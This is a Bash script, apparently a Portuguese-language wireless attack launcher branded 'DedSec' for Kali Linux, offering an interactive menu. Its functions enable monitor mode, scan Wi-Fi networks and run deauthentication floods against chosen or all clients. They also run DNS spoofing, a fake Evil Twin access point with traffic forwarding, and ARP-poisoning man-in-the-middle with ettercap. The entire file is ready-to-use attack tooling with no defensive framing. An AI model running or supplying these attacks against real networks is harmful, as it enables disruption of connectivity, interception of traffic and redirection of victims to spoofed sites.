#!/bin/bash

# Cores
verde='\033[0;32m'
vermelho='\033[0;31m'
neutro='\033[0m'

function banner() {
    clear
    echo -e "${verde}
  _____           _  _____           
 |  __ \         | |/ ____|          
 | |  | | ___  __| | (___   ___  ___ 
 | |  | |/ _ \/ _' |\___ \ / _ \/ __|
 | |__| |  __/ (_| |____) |  __/ (__ 
 |_____/ \___|\__,_|_____/ \___|\___|
    Wireless Attacks | Kali Linux 🐉
    ${neutro}"
}

# Ativar modo monitor
function modo_monitor() {
    read -p "Interface Wi-Fi (ex: wlan0): " iface
    sudo airmon-ng check kill
    sudo airmon-ng start "$iface"
    echo "[✓] Modo monitor ativado em ${iface}mon"
    sleep 2
}

# Desativar modo monitor
function parar_monitor() {
    read -p "Interface monitor (ex: wlan0mon): " iface
    sudo airmon-ng stop "$iface"
    sudo systemctl restart NetworkManager
    echo "[✓] Modo monitor parado."
    sleep 2
}

# Escanear redes
function escanear_redes() {
    read -p "Interface monitor (ex: wlan0mon): " iface
    echo "[⏳] Escaneando redes. Pressione CTRL+C para parar."
    sleep 2
    sudo airodump-ng "$iface"
}

# Ataque de Deauth
function ataque_deauth() {
    read -p "Interface monitor: " iface
    read -p "BSSID do alvo: " bssid
    read -p "Canal: " canal
    read -p "MAC da vítima (ou FF:FF:FF:FF:FF:FF para todos): " target_mac
    sudo airodump-ng --bssid "$bssid" -c "$canal" "$iface" &
    sleep 5
    xterm -hold -e "aireplay-ng --deauth 1000 -a $bssid -c $target_mac $iface" &
    echo "[✓] Ataque deautenticador iniciado."
    sleep 3
}

# Ataque DNS spoof (dnsspoof)
function dns_spoof() {
    read -p "Interface de rede (eth0, wlan0): " iface
    echo "Exemplo: www.google.com A 192.168.1.100" > spoof.txt
    echo "[✓] Adicione domínios a spoof.txt (um por linha)"
    read -p "Pressione ENTER para iniciar spoof..."
    sudo dnsspoof -i "$iface" -f spoof.txt
}

# Ataque Evil Twin simplificado
function evil_twin() {
    echo "[!] Requer hostapd + dnsmasq + iptables configurados"
    read -p "Interface monitor: " iface
    read -p "SSID falso: " ssid
    echo "[*] Criando rede falsa: $ssid em $iface"
    sudo systemctl stop NetworkManager
    # sudo hostapd evil.conf -B
    # sudo dnsmasq -C evil-dhcp.conf
    DIR="$(dirname "$0")"
sudo hostapd "$DIR/evil.conf" -B
sudo dnsmasq -C "$DIR/evil-dhcp.conf"

    sudo iptables --flush
    sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    echo 1 > /proc/sys/net/ipv4/ip_forward
    echo "[✓] Evil Twin iniciado"
    sleep 2
}

# MITM com ettercap
function mitm_ettercap() {
    read -p "Interface de rede: " iface
    sudo ettercap -T -q -i "$iface" -M arp:remote / / -P dns_spoof
}

# Menu principal
function menu_principal() {
    while true; do
        banner
        echo -e "${verde}
[1] Ativar modo monitor
[2] Parar modo monitor
[3] Escanear redes Wi-Fi
[4] Ataque Deauth
[5] DNS Spoofing (dnsspoof)
[6] Evil Twin Attack
[7] MITM com Ettercap
[8] Sair
${neutro}"
        read -p "Escolha uma opção: " opt
        case $opt in
            1) modo_monitor ;;
            2) parar_monitor ;;
            3) escanear_redes ;;
            4) ataque_deauth ;;
            5) dns_spoof ;;
            6) evil_twin ;;
            7) mitm_ettercap ;;
            8) echo "Saindo..."; break ;;
            *) echo "Opção inválida." && sleep 1 ;;
        esac
    done
}

menu_principal
